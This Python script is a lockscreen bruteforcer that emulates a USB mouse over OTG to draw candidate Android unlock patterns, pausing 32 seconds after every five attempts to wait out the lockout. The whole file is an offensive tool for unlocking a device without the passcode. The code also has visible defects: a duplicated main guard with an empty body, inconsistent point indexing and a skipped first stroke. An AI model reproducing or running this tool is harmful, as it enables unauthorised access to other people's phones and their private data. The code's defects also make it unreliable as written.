#!/usr/bin/python3
#
#   /\_____ ______ _______/\_________
#.:=\___   |   __/ \_____/\______    \=== :: =>>
#     /    |    \  /     \  /   |     \
#    /     _     \/       \/    |      \
#  _/      |      \__      \_   :       \
#  \       |        /       /           /
#   \______|       /____   /_____      /Bruteforcer..
#.::= =====|______/====|__/=====|_____/===::>> v1.0
#
# Script to bruteforce a lockscreen emulating mousemovements via OTG.
# Should not work on modern Android due to lockscreen timemouts increasing.
#
# https://github.com/magpol
import time
import sys
from zero_hid import Mouse

m = Mouse()

POINTS = [(60, 0), (120, 50), (180, 50), (60, 100), (120, 100), (180, 100), (60, 150), (120, 150), (180, 150)]
MAX_MOVEMENT = 120
MAX_ATTEMPTS = 5
MAX_ATTEMPTS_TIMEOUT = 32

def calculate_pixel_difference(point1, point2):
    x1, y1 = POINTS[point1 - 1]
    x2, y2 = POINTS[point2 - 1]

    movements_x, movements_y = x2 - x1, y2 - y1
    move_mouse_pointer_s(movements_x, movements_y)
    time.sleep(1)

def move_to_point(point):
    x, y = POINTS[point]
    move_mouse_pointer_s(x, y)
    m.left_click(release=False)
    time.sleep(1)

def move_mouse_pointer_s(movements_x, movements_y):
    while movements_x != 0 or movements_y != 0:
        chunk_x = min(movements_x, MAX_MOVEMENT) if movements_x > 0 else max(movements_x, -MAX_MOVEMENT)
        chunk_y = min(movements_y, MAX_MOVEMENT) if movements_y > 0 else max(movements_y, -MAX_MOVEMENT)
        m.move(chunk_x, chunk_y)
        movements_x -= chunk_x
        movements_y -= chunk_y

def reset_mouse_pointer():
    for _ in range(10):
        move_mouse_pointer_s(-120, -120)
    time.sleep(2)

if __name__ == "__main__":


if __name__ == "__main__":
    print(f"HID Bruteforcer v1.0 - https://github.com/magpol")
    if len(sys.argv) != 2:
        print("Usage: python script.py patterns.txt")
        sys.exit(1)

    filename = sys.argv[1]


    try:
        with open(filename, "r") as file:
            lines = file.readlines()

        if not lines:
            raise FileNotFoundError(f"Error: The pattern file '{filename}' is empty.")

        counter = 0
        reset_mouse_pointer()

        for line in lines:
            print(f"Testing: {line.strip()}")
            points = list(map(int, line.strip()))
            move_to_point(points[0])

            for i in range(1, len(points) - 1):
                calculate_pixel_difference(points[i], points[i + 1])

            m.release()
            time.sleep(1)
            reset_mouse_pointer()
            counter += 1
            print(f"Attempt {counter} of 5")

            if counter >= MAX_ATTEMPTS:
                print("Waiting 32 seconds...")
                time.sleep(MAX_ATTEMPTS_TIMEOUT)
                counter = 0
                reset_mouse_pointer()

    except FileNotFoundError:
        print(f"Error: The pattern file '{filename}' does not exist.")
    except Exception as e:
        print(f"Error: {str(e)}")
